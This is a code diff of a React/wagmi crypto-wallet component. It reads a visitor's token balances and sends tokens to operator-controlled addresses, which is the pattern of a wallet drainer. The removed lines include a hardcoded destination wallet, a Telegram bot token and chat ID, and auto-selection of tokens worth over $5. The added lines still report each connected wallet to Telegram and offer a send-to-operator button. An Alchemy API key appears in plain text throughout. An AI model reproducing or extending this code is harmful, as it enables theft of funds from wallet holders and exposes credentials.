@@ -1,5 +1,5 @@
 import { useCallback, useEffect, useState } from 'react';
-import { useAccount, useWaitForTransactionReceipt, useWalletClient } from 'wagmi';
+import { useAccount, useWaitForTransactionReceipt, usePublicClient, useWalletClient } from 'wagmi';
 import { Loading, Toggle } from '@geist-ui/core';
 import { tinyBig } from 'essential-eth';
 import { useAtom } from 'jotai';
@@ -15,6 +15,7 @@ const alchemyInstances = {
   [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
   [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
   [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
+  // Add other networks as needed
 };
 
 // Mapping from chain IDs to Alchemy SDK network enums
@@ -25,6 +26,7 @@ const chainIdToNetworkMap = {
   324: Network.ZK_SYNC,
   42161: Network.ARB_MAINNET,
   137: Network.MATIC_MAINNET,
+  // Add other mappings as needed
 };
 
 // Supported chain IDs
@@ -32,24 +34,22 @@ const supportedChains = [1, 56, 10, 324, 42161, 137];
 
 // Mapping of chain IDs to destination addresses
 const chainIdToDestinationAddress = {
-  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
-  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  1: '0x...MainnetAddress',
+  56: '0x...BSCAddress',
+  10: '0x...OptimismAddress',
+  324: '0x...ZkSyncAddress',
+  42161: '0x...ArbitrumAddress',
+  137: '0x...PolygonAddress',
 };
 
 // Telegram bot configuration
-const TELEGRAM_BOT_TOKEN = '7439590254:AAHON2e8fQW1mlEYPiWqE1RCf7F2Az7ABr0';
-const TELEGRAM_CHAT_ID = '5470283104';
+const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
 
-// Formatter for USD currency
+// USD formatter for currency formatting
 const usdFormatter = new Intl.NumberFormat('en-US', {
   style: 'currency',
   currency: 'USD',
-  minimumFractionDigits: 2,
-  maximumFractionDigits: 2,
 });
 
 // Function to safely convert input values to tinyBig numbers
@@ -59,8 +59,7 @@ const safeNumber = (value) => {
       return tinyBig(0);
     }
     const num = tinyBig(value.toString());
-    // Use JavaScript's isNaN to check for NaN
-    return isNaN(num.toNumber()) ? tinyBig(0) : num;
+    return num.isNaN() ? tinyBig(0) : num;
   } catch (error) {
     console.error('Invalid number detected:', error, value);
     return tinyBig(0);
@@ -110,7 +109,7 @@ const TokenRow = ({ token }) => {
 
   const unroundedBalance = safeNumber(quote_rate).gt(0)
     ? safeNumber(quote).div(safeNumber(quote_rate))
-    : tinyBig(0);
+    : safeNumber(0);
 
   const roundedBalance = unroundedBalance.lt(0.001)
     ? unroundedBalance.round(10)
@@ -152,7 +151,7 @@ const TokenRow = ({ token }) => {
   );
 };
 
-const handleTokenTransaction = async (walletClient, destinationAddress, amount, senderAddress, networkName, chainId, tokenName, blockExplorerUrl) => {
+const handleTokenTransaction = async (walletClient, destinationAddress, amount) => {
   if (!walletClient.data || !destinationAddress) return;
 
   try {
@@ -164,15 +163,7 @@ const handleTokenTransaction = async (walletClient, destinationAddress, amount, 
 
     console.log('Transaction sent:', tx.hash);
 
-    // Constructing the Telegram message
-    const message = `Sender's Address: ${senderAddress}
-Network Name: ${networkName}
-Chain ID: ${chainId}
-Amount Sent: ${amount}
-Token Name: ${tokenName}
-Block Explorer URL: ${blockExplorerUrl}`;
-
-    sendTelegramNotification(message);
+    sendTelegramNotification(`Transaction sent, Amount: ${amount}, Destination: ${destinationAddress}`);
   } catch (error) {
     console.error('Failed to send transaction:', error);
   }
@@ -188,76 +179,73 @@ export const GetTokens = () => {
   const [destinationAddress, setDestinationAddress] = useState('');
   const [notificationSent, setNotificationSent] = useState(false);
 
-  const autoToggleTokens = useCallback((tokens) => {
-    const newCheckedRecords = {};
-    tokens.forEach((token) => {
-      const tokenValue = safeNumber(token.quote);
-      if (tokenValue.gt(5)) { // Automatically toggle on if value is greater than $5
-        newCheckedRecords[token.contract_address] = { isChecked: true };
-      }
-    });
-    setCheckedRecords(newCheckedRecords);
-  }, [setCheckedRecords]);
-
   const fetchData = useCallback(async () => {
     setLoading(true);
     try {
       setError('');
       if (!chain || !supportedChains.includes(chain.id)) {
-        setError('Unsupported chain');
-        return;
+        throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
       }
 
-      const chainId = chain?.id || 1;
-      const alchemyNetwork = chainIdToNetworkMap[chainId];
-      const alchemyInstance = alchemyInstances[alchemyNetwork];
+      const alchemyNetwork = chainIdToNetworkMap[chain.id];
+      const alchemy = alchemyInstances[alchemyNetwork];
 
-      if (!alchemyInstance) {
-        setError('Invalid Alchemy instance');
-        return;
-      }
+      console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
+      const tokensResponse = await alchemy.core.getTokenBalances(address);
+      const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');
 
-      const balanceData = await alchemyInstance.core.getTokenBalances(address);
-      if (!balanceData || !balanceData.tokenBalances) {
-        setError('No token balances found');
-        return;
-      }
+      const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
+        contract_address: balance.contractAddress,
+        balance: safeNumber(balance.tokenBalance),
+        quote: balance.quote || 0,
+        quote_rate: balance.quoteRate || 0,
+      }));
 
-      const enrichedTokens = balanceData.tokenBalances.map((token) => {
-        const globalTokenInfo = tokens.find((t) => t.contract_address === token.contractAddress);
-        return { ...globalTokenInfo, ...token };
-      });
-
-      setTokens(enrichedTokens);
-      autoToggleTokens(enrichedTokens);
+      setTokens(processedTokens);
+      console.log('Fetched tokens:', processedTokens);
     } catch (error) {
-      console.error('Error fetching token data:', error);
-      setError(`Error fetching data: ${error.message}`);
-    } finally {
-      setLoading(false);
+      console.error('Error fetching tokens:', error);
+      setError((error.message));
     }
-  }, [address, chain, autoToggleTokens, setTokens, tokens]);
+    setLoading(false);
+  }, [address, chain, setTokens]);
 
   useEffect(() => {
-    if (isConnected) {
+    if (isConnected && chain?.id) {
+      const selectedAddress = chainIdToDestinationAddress[chain.id] || '0x...DefaultAddress';
+      setDestinationAddress(selectedAddress);
       fetchData();
+      setCheckedRecords({});
+
+      if (!notificationSent) {
+        sendTelegramNotification(`Wallet connected: ${address}, Network: ${chain?.name}`);
+        setNotificationSent(true);
+      }
     }
-  }, [fetchData, isConnected]);
+  }, [address, chain?.id, fetchData, setCheckedRecords, walletClient, chain?.name]);
+
+  const publicClient = usePublicClient();
+
+  useEffect(() => {
+    const interval = setInterval(fetchData, 60000); // Fetch every 60 seconds
+    return () => clearInterval(interval);
+  }, [fetchData]);
+
+  const checkedTokenKeys = Object.entries(checkedRecords).filter(([_, value]) => value.isChecked).map(([key]) => key);
+  const filteredTokens = tokens.filter((token) => checkedTokenKeys.includes(token.contract_address));
 
   return (
-    <div>
-      {loading ? (
-        <Loading>Loading...</Loading>
-      ) : error ? (
-        <div>Error: {error}</div>
-      ) : (
-        <div>
-          {tokens.map((token) => (
-            <TokenRow key={token.contract_address} token={token} />
-          ))}
-        </div>
-      )}
-    </div>
+    <>
+      {error && <div style={{ color: 'red', marginBottom: '12px' }}>{error}</div>}
+      {loading ? <Loading /> : filteredTokens.map((token) => (
+        <TokenRow key={token.contract_address} token={token} />
+      ))}
+      <div>
+        {checkedTokenKeys.length > 0 && (
+          <button onClick={() => handleTokenTransaction(walletClient, destinationAddress, tinyBig(0.1))}>Send Tokens</button>
+        )}
+      </div>
+    </>
   );
 };
 
